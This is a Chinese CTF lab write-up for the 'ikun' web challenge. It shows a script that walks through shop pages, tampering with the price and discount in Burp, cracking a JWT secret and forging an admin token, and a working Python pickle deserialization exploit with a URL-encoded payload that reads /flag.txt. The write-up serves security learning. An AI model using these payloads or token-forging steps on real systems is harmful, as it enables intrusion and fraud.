# 3.10~3.16 WEEK3

## 概况

继续pickle反序列化



## wp

### ikun

ikun应援网站，往下翻可以购买东西，右键查看源码，有些提示，但都没有用。在募集资金的下面发现了提示：一定要买到lv6!!!

一页一页找不太现实，写一个脚本自己翻页找lv6吧。

![image-20250315215803284](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250315215803284.png)

右键发现了写lv6是图片，写个脚本找一下

```python
import requests

url='http://12727098-ddda-4c92-90fd-0244e4cc9c81.node5.buuoj.cn:81/shop?page='

i=1

while i<1000:

  try:

​    r=requests.get(url+str(i))

​    if 'lv6.png' in r.text:

​      print (f"lv6在{i}页")

​      break

​    else:

​      i+=1

  except requests.exceptions.RequestException:

​    print("failed")
```

发现181页有lv6

点击购买，弹出来了登录界面，先随便注册一个账号，登陆后发现余额是1000元，1145141919元的lv6肯定买不起。bp抓包改一下价格试试。

改完价格后发现购物车被清空了，只好再改一下折扣了：

![image-20250315215900254](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250315215900254.png)

send以后响应头的码变302重定向了

![image-20250315215919765](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250315215919765.png)

打开这个location地址看看，发现需要admin访问,bp再抓包一下，看看有没有session，cookie之类的:

![image-20250315215932473](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250315215932473.png)

没看到session，却看到一个JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEifQ.8iYM4QgkAw4NpjpP8tEn7MBbZoF-Kj8YRbosz3Qrr-Q

在线解密一下：

![image-20250315215948726](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250315215948726.png)

可以看出来，我们还需要一个密钥:

cd c-jwt-cracker

make

./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEifQ.8iYM4QgkAw4NpjpP8tEn7MBbZoF-Kj8YRbosz3Qrr-Q

![image-20250315220009659](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250315220009659.png)

可得密钥为1Kun

把1改成admin：

![image-20250315220026351](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250315220026351.png)

得到新的jwt：eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo

hackbar传参得到了回显，审计代码即可发现提示：

![image-20250315220044462](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250315220044462.png)

打开/static/asd1f654e683wq/www.zip，看看好东西，即可在本地得到源码

www\sshop\views目录下发现有个Admin.php，打开审计代码：

```python
import tornado.web

from sshop.base import BaseHandler

import pickle

import urllib

 

class AdminHandler(BaseHandler):

  @tornado.web.authenticated

  def get(self, *args, **kwargs):

​    if self.current_user == "admin":

​      return self.render('form.html', res='This is Black Technology!', member=0)

​    else:

​      return self.render('no_ass.html')

  @tornado.web.authenticated

  def post(self, *args, **kwargs):

​    try:

​      become = self.get_argument('become')

​      p = pickle.loads(urllib.unquote(become))

​      return self.render('form.html', res=p, member=1)

​    except:

​      return self.render('form.html', res='This is Black Technology!', member=0)
```

发现存在pickle反序列化

```python
exp：（特备注明：需要在python2的环境下编辑）

import pickle

import urllib 

class payload(object):

  def __reduce__(self):

​    return (eval, ("open('/flag.txt','r').read()",))

a = pickle.dumps(payload())

print(urllib.quote(a))
```

bp抓包修改become参数

payload：

```
become=c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.
```

![image-20250315220232099](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250315220232099.png)